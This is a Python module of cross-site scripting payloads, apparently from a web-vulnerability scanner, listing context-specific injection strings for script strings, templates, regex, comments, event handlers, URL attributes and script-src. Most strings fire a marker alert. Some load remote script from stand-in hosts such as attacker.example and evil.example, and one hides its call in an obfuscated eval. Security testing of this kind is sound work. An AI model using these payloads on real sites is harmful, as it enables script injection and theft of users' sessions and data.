# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Script, event-handler, URL, and script-src context payloads."""

SCRIPT_STRING_D = [
    '"-alert(\'{marker}\')-"',
    '";alert(\'{marker}\');//',
    '";\nalert(\'{marker}\');\n//',
    '\\"-alert(\'{marker}\')-\\"',
    '"+alert(\'{marker}\')+\\"',
]

SCRIPT_STRING_S = [
    "'-alert('{marker}')-'",
    "';alert('{marker}');//",
    "';\nalert('{marker}');\n//",
    "\\'-alert('{marker}')-\\'",
]

SCRIPT_BARE = [
    ";alert('{marker}')//",
    "\nalert('{marker}')\n",
    "/**/;alert('{marker}')//",
    "};alert('{marker}');//",
    "]};alert('{marker}');//",
]

SCRIPT_TEMPLATE = [
    "`-alert('{marker}')-`",
    "`;alert('{marker}')//`",
    "${{alert('{marker}')}}",
    "`${{alert('{marker}')}}",
    "`;alert('{marker}')//",
]

SCRIPT_REGEX = [
    "/;alert('{marker}')//",
    "/;alert('{marker}');var x=/",
    "/.test('');alert('{marker}');//",
    "/g;alert('{marker}');//",
]

SCRIPT_COMMENT = [
    "*/;alert('{marker}');///*",
    "*/alert('{marker}')/*",
    "*/;alert('{marker}');var x=/*",
    "*/ alert('{marker}') /*",
]

EVENT_HANDLER = [
    "alert('{marker}')",
    "confirm('{marker}')",
    "(function(){{alert('{marker}')}})();",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "[1].find(alert)",
]

URL_ATTR = [
    "javascript:alert('{marker}')",
    "JaVaScRiPt:alert('{marker}')",
    "javascript&#58;alert('{marker}')",
    "javascript:void(alert('{marker}'))",
    "data:text/html,<script>alert('{marker}')</script>",
    "//attacker.example/xss.js?{marker}",
    # Juice Shop DOM/Reflected XSS: backtick JS URI (bypasses quote-stripping filters)
    "javascript:alert(`{marker}`)",
]

SCRIPT_SRC = [
    "//attacker.example/{marker}.js",
    "//evil.example/xss/{marker}",
    "http://attacker.example/{marker}.js",
    '"><script>alert("{marker}")</script>',
    "'><script>alert('{marker}')</script>",
]
